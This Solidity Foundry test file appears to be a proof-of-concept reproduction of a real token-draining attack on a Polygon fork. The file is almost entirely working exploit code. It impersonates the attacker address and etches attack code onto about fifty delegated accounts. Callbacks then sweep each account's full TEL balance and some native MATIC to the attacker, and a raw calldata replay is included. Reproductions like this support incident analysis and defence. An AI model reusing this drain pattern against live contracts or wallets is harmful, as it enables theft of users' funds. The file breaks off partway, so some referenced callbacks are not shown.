
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 51546495;
    uint256 constant TX_TIMESTAMP = 1703525020;
    uint256 constant TX_BLOCK_NUMBER = 51546496;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
        vm.etch(Addresses.delegate_storage_context, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context);
        vm.etch(Addresses.delegate_storage_context_5500, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_5500);
        vm.etch(Addresses.delegate_storage_context_3C26, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_3C26);
        vm.etch(Addresses.delegate_storage_context_DF0E, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_DF0E);
        vm.etch(Addresses.delegate_storage_context_4087, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_4087);
        vm.etch(Addresses.delegate_storage_context_4C4D, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_4C4D);
        vm.etch(Addresses.delegate_storage_context_C892, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_C892);
        vm.etch(Addresses.delegate_storage_context_A76D, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_A76D);
        vm.etch(Addresses.delegate_storage_context_D5C8, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_D5C8);
        vm.etch(Addresses.delegate_storage_context_D3CE, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_D3CE);
        vm.etch(Addresses.delegate_storage_context_10D6, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_10D6);
        vm.etch(Addresses.delegate_storage_context_D1AB, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_D1AB);
        vm.etch(Addresses.delegate_storage_context_D505, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_D505);
        vm.etch(Addresses.delegate_storage_context_D828, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_D828);
        vm.etch(Addresses.delegate_storage_context_FB5A, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_FB5A);
        vm.etch(Addresses.delegate_storage_context_1DAD, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_1DAD);
        vm.etch(Addresses.delegate_storage_context_81C0, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_81C0);
        vm.etch(Addresses.delegate_storage_context_3ADD, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_3ADD);
        vm.etch(Addresses.delegate_storage_context_57E3, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_57E3);
        vm.etch(Addresses.delegate_storage_context_145C, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_145C);
        vm.etch(Addresses.delegate_storage_context_F024, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_F024);
        vm.etch(Addresses.delegate_storage_context_5596, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_5596);
        vm.etch(Addresses.delegate_storage_context_D610, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_D610);
        vm.etch(Addresses.delegate_storage_context_7879, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_7879);
        vm.etch(Addresses.delegate_storage_context_B518, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_B518);
        vm.etch(Addresses.delegate_storage_context_00AA, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_00AA);
        vm.etch(Addresses.delegate_storage_context_09EF, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_09EF);
        vm.etch(Addresses.delegate_storage_context_8CDD, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_8CDD);
        vm.etch(Addresses.delegate_storage_context_4EBC, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_4EBC);
        vm.etch(Addresses.delegate_storage_context_7B20, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_7B20);
        vm.etch(Addresses.delegate_storage_context_411D, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_411D);
        vm.etch(Addresses.delegate_storage_context_63C0, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_63C0);
        vm.etch(Addresses.delegate_storage_context_D1FA, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_D1FA);
        vm.etch(Addresses.delegate_storage_context_8B3E, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_8B3E);
        vm.etch(Addresses.delegate_storage_context_D53A, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_D53A);
        vm.etch(Addresses.delegate_storage_context_C649, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_C649);
        vm.etch(Addresses.delegate_storage_context_BCB6, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_BCB6);
        vm.etch(Addresses.delegate_storage_context_D6B7, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_D6B7);
        vm.etch(Addresses.delegate_storage_context_0B63, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_0B63);
        vm.etch(Addresses.delegate_storage_context_7017, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_7017);
        vm.etch(Addresses.delegate_storage_context_FD48, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_FD48);
        vm.etch(Addresses.delegate_storage_context_B10B, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_B10B);
        vm.etch(Addresses.delegate_storage_context_18C3, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_18C3);
        vm.etch(Addresses.delegate_storage_context_F9AC, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_F9AC);
        vm.etch(Addresses.delegate_storage_context_3FD3, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_3FD3);
        vm.etch(Addresses.delegate_storage_context_5D22, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_5D22);
        vm.etch(Addresses.delegate_storage_context_8B3B, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_8B3B);
        vm.etch(Addresses.delegate_storage_context_CF87, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_CF87);
        vm.etch(Addresses.delegate_storage_context_9B05, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(Addresses.delegate_storage_context_9B05);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "MATIC", 4249835172122553405600);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.TEL, "TEL", 14175575188);
    }
}

contract OurAttack {














    function attack() external payable {
        _attack();
    }

    function _callback() internal {
        _markCallback(0);
        uint256 telBalanceOfDelegateStorageContext =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback2() internal {
        _markCallback(1);
        uint256 telBalanceOfDelegateStorageContext5500 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_5500);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext5500);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_5500);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 4249980000000000000000) nativeTransferAmount = 4249980000000000000000;
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
    }

    function _callback3() internal {
        _markCallback(2);
        uint256 telBalanceOfDelegateStorageContext3c26 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_3C26);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext3c26);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_3C26);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _attack() internal {
        _attackCall();
        _attackCall2();
        _attackCall3();
    }

    function _attackCall() internal {
        OurAttack(payable(Addresses.delegate_storage_context_81C0)).callback18();
        OurAttack(payable(Addresses.delegate_storage_context_D505)).callback14();
        OurAttack(payable(Addresses.delegate_storage_context_5500)).callback2();
        OurAttack(payable(Addresses.delegate_storage_context_F024)).callback22();
        OurAttack(payable(Addresses.delegate_storage_context_4087)).callback6();
        OurAttack(payable(Addresses.delegate_storage_context_5D22)).callback47();
        OurAttack(payable(Addresses.delegate_storage_context_D3CE)).callback11();
        OurAttack(payable(Addresses.delegate_storage_context_0B63)).callback40();
        OurAttack(payable(Addresses.delegate_storage_context_D6B7)).callback39();
        OurAttack(payable(Addresses.delegate_storage_context)).callback();
        OurAttack(payable(Addresses.delegate_storage_context_D1AB)).callback13();
        OurAttack(payable(Addresses.delegate_storage_context_00AA)).callback27();
        OurAttack(payable(Addresses.delegate_storage_context_9B05)).callback50();
        OurAttack(payable(Addresses.delegate_storage_context_5596)).callback23();
        OurAttack(payable(Addresses.delegate_storage_context_7879)).callback25();
        OurAttack(payable(Addresses.delegate_storage_context_3ADD)).callback19();
        OurAttack(payable(Addresses.delegate_storage_context_F9AC)).callback45();
        OurAttack(payable(Addresses.delegate_storage_context_4EBC)).callback30();
        OurAttack(payable(Addresses.delegate_storage_context_4C4D)).callback7();
        OurAttack(payable(Addresses.delegate_storage_context_FD48)).callback42();
    }

    function _attackCall2() internal {
        OurAttack(payable(Addresses.delegate_storage_context_D5C8)).callback10();
        OurAttack(payable(Addresses.delegate_storage_context_8B3B)).callback48();
        OurAttack(payable(Addresses.delegate_storage_context_DF0E)).callback5();
        OurAttack(payable(Addresses.delegate_storage_context_3C26)).callback3();
        OurAttack(payable(Addresses.delegate_storage_context_18C3)).callback44();
        OurAttack(payable(Addresses.delegate_storage_context_BCB6)).callback38();
        OurAttack(payable(Addresses.delegate_storage_context_B10B)).callback43();
        OurAttack(payable(Addresses.delegate_storage_context_145C)).callback21();
        OurAttack(payable(Addresses.delegate_storage_context_D53A)).callback36();
        OurAttack(payable(Addresses.delegate_storage_context_63C0)).callback33();
        OurAttack(payable(Addresses.delegate_storage_context_1DAD)).callback17();
        OurAttack(payable(Addresses.delegate_storage_context_A76D)).callback9();
        OurAttack(payable(Addresses.delegate_storage_context_3FD3)).callback46();
        OurAttack(payable(Addresses.delegate_storage_context_D828)).callback15();
        OurAttack(payable(Addresses.delegate_storage_context_7B20)).callback31();
        OurAttack(payable(Addresses.delegate_storage_context_C892)).callback8();
        OurAttack(payable(Addresses.delegate_storage_context_7017)).callback41();
        OurAttack(payable(Addresses.delegate_storage_context_B518)).callback26();
        OurAttack(payable(Addresses.delegate_storage_context_FB5A)).callback16();
        OurAttack(payable(Addresses.delegate_storage_context_411D)).callback32();
    }

    function _attackCall3() internal {
        OurAttack(payable(Addresses.delegate_storage_context_09EF)).callback28();
        OurAttack(payable(Addresses.delegate_storage_context_CF87)).callback49();
        OurAttack(payable(Addresses.delegate_storage_context_8B3E)).callback35();
        OurAttack(payable(Addresses.delegate_storage_context_57E3)).callback20();
        OurAttack(payable(Addresses.delegate_storage_context_D610)).callback24();
        OurAttack(payable(Addresses.delegate_storage_context_8CDD)).callback29();
        OurAttack(payable(Addresses.delegate_storage_context_D1FA)).callback34();
        OurAttack(payable(Addresses.delegate_storage_context_10D6)).callback12();
        OurAttack(payable(Addresses.delegate_storage_context_C649)).callback37();
        {
            bytes memory replayCallData =
                hex"d1f5789400000000000000000000000010e5c8d3537856f141272e1c39befdab4dd8bde000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000004a8b8989800000000000000000000000000000000000000000000000000000000";
            (bool ok,) = Addresses.A_191C6C_3734.call(replayCallData);
            ok;
        }
    }

    function _callback4() internal {
        _markCallback(4);
    }

    function _callback5() internal {
        _markCallback(5);
        uint256 telBalanceOfDelegateStorageContextDf0e =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_DF0E);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextDf0e);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_DF0E);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback6() internal {
        _markCallback(6);
        uint256 telBalanceOfDelegateStorageContext4087 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_4087);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext4087);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_4087);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback7() internal {
        _markCallback(7);
        uint256 telBalanceOfDelegateStorageContext4c4d =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_4C4D);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext4c4d);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_4C4D);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback8() internal {
        _markCallback(8);
        uint256 telBalanceOfDelegateStorageContextC892 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_C892);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextC892);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_C892);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback9() internal {
        _markCallback(9);
        uint256 telBalanceOfDelegateStorageContextA76d =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_A76D);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextA76d);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_A76D);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback10() internal {
        _markCallback(10);
        uint256 telBalanceOfDelegateStorageContextD5c8 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_D5C8);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextD5c8);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_D5C8);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback11() internal {
        _markCallback(11);
        uint256 telBalanceOfDelegateStorageContextD3ce =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_D3CE);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextD3ce);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_D3CE);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback12() internal {
        _markCallback(12);
        uint256 telBalanceOfDelegateStorageContext10d6 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_10D6);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext10d6);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_10D6);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback13() internal {
        _markCallback(13);
        uint256 telBalanceOfDelegateStorageContextD1ab =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_D1AB);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextD1ab);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_D1AB);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 760000000000) nativeTransferAmount = 760000000000;
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
    }

    function _callback14() internal {
        _markCallback(14);
        uint256 telBalanceOfDelegateStorageContextD505 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_D505);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextD505);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_D505);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback15() internal {
        _markCallback(15);
        uint256 telBalanceOfDelegateStorageContextD828 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_D828);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextD828);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_D828);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback16() internal {
        _markCallback(16);
        uint256 telBalanceOfDelegateStorageContextFb5a =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_FB5A);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextFb5a);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_FB5A);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback17() internal {
        _markCallback(17);
        uint256 telBalanceOfDelegateStorageContext1dad =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_1DAD);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext1dad);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_1DAD);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback18() internal {
        _markCallback(18);
        uint256 telBalanceOfDelegateStorageContext81c0 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_81C0);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext81c0);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_81C0);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback19() internal {
        _markCallback(19);
        uint256 telBalanceOfDelegateStorageContext3add =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_3ADD);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext3add);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_3ADD);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback20() internal {
        _markCallback(20);
        uint256 telBalanceOfDelegateStorageContext57e3 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_57E3);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext57e3);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_57E3);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback21() internal {
        _markCallback(21);
        uint256 telBalanceOfDelegateStorageContext145c =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_145C);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext145c);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_145C);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback22() internal {
        _markCallback(22);
        uint256 telBalanceOfDelegateStorageContextF024 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_F024);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextF024);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_F024);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback23() internal {
        _markCallback(23);
        uint256 telBalanceOfDelegateStorageContext5596 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_5596);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext5596);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_5596);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback24() internal {
        _markCallback(24);
        uint256 telBalanceOfDelegateStorageContextD610 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_D610);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextD610);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_D610);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback25() internal {
        _markCallback(25);
        uint256 telBalanceOfDelegateStorageContext7879 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_7879);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext7879);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_7879);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback26() internal {
        _markCallback(26);
        uint256 telBalanceOfDelegateStorageContextB518 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_B518);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextB518);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_B518);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback27() internal {
        _markCallback(27);
        uint256 telBalanceOfDelegateStorageContext00aa =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_00AA);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext00aa);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_00AA);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback28() internal {
        _markCallback(28);
        uint256 telBalanceOfDelegateStorageContext09ef =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_09EF);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext09ef);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_09EF);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback29() internal {
        _markCallback(29);
        uint256 telBalanceOfDelegateStorageContext8cdd =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_8CDD);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext8cdd);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_8CDD);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback30() internal {
        _markCallback(30);
        uint256 telBalanceOfDelegateStorageContext4ebc =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_4EBC);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext4ebc);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_4EBC);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback31() internal {
        _markCallback(31);
        uint256 telBalanceOfDelegateStorageContext7b20 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_7B20);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext7b20);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_7B20);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback32() internal {
        _markCallback(32);
        uint256 telBalanceOfDelegateStorageContext411d =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_411D);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext411d);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_411D);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback33() internal {
        _markCallback(33);
        uint256 telBalanceOfDelegateStorageContext63c0 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_63C0);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext63c0);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_63C0);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback34() internal {
        _markCallback(34);
        uint256 telBalanceOfDelegateStorageContextD1fa =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_D1FA);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextD1fa);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_D1FA);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback35() internal {
        _markCallback(35);
        uint256 telBalanceOfDelegateStorageContext8b3e =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_8B3E);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContext8b3e);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_8B3E);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback36() internal {
        _markCallback(36);
        uint256 telBalanceOfDelegateStorageContextD53a =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_D53A);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextD53a);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_D53A);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback37() internal {
        _markCallback(37);
        uint256 telBalanceOfDelegateStorageContextC649 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_C649);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextC649);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_C649);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }

    function _callback38() internal {
        _markCallback(38);
        uint256 telBalanceOfDelegateStorageContextBcb6 =
            IERC20Like(Addresses.TEL).balanceOf(Addresses.delegate_storage_context_BCB6);
        IERC20Like(Addresses.TEL).transfer(Addresses.attacker_eoa, telBalanceOfDelegateStorageContextBcb6);
        IERC20Like(Addresses.LINK).balanceOf(Addresses.delegate_storage_context_BCB6);
        IERC20Like(Addresses.LINK).transfer(Addresses.attacker_eoa, 0);
    }
